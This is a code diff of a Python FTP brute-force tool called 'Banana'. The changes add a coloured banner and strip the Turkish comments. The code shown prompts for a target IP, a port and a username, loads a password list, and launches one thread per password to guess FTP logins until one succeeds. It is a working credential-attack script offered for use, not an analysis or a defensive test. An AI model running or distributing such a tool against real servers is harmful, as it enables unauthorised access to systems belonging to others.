@@ -2,18 +2,19 @@ import os
 import ftplib
 import threading
 
-# Ekranı temizle
+YELLOW = "\033[93m"
+RESET = "\033[0m"
+
 os.system("clear")
 
-# Banana ASCII
-print(r"""
+print(f"""{YELLOW}
   ___                           
  | _ ) __ _ _ _  __ _ _ _  __ _ 
  | _ \/ _` | ' \/ _` | ' \/ _` |
  |___/\__,_|_||_\__,_|_||_\__,_|
+{RESET}
 """)
 
-# Giriş bilgileri
 target = input("🌐 Target IP address: ").strip()
 port = input("🔌 Port (default 21): ").strip()
 port = int(port) if port else 21
@@ -21,10 +22,7 @@ username = input("👤 FTP Username (leave blank for 'anonymous'): ").strip()
 if username == "":
     username = "anonymous"
 
-# Şifre listesi seçimi
 choice = input("📂 Use ready-made 'passlist.txt'? (y/n): ").strip().lower()
-passwords = []
-
 if choice == "y":
     path = "passlist.txt"
     if not os.path.isfile(path):
@@ -37,14 +35,12 @@ else:
         print(f"❌ File not found: {path}")
         exit()
 
-# Parolaları yükle
 with open(path, "r", encoding="utf-8", errors="ignore") as f:
     passwords = f.read().splitlines()
 
 print(f"\n🚀 Starting FTP brute-force on {target}:{port} as '{username}' with {len(passwords)} passwords...\n")
 print("⚠️  Output hidden for speed. Please wait...\n")
 
-# Thread stoplama flagi
 found = threading.Event()
 
 def try_password(password):
@@ -60,7 +56,6 @@ def try_password(password):
     except:
         pass
 
-# Tüm şifreleri dene (threaded)
 threads = []
 for pw in passwords:
     if found.is_set():
@@ -69,9 +64,8 @@ for pw in passwords:
     threads.append(t)
     t.start()
 
-# Tüm thread'leri bekle
 for t in threads:
     t.join()
 
 if not found.is_set():
-    print("\n❌ No valid password/username found.")
+    print("\n❌ No valid password found.")
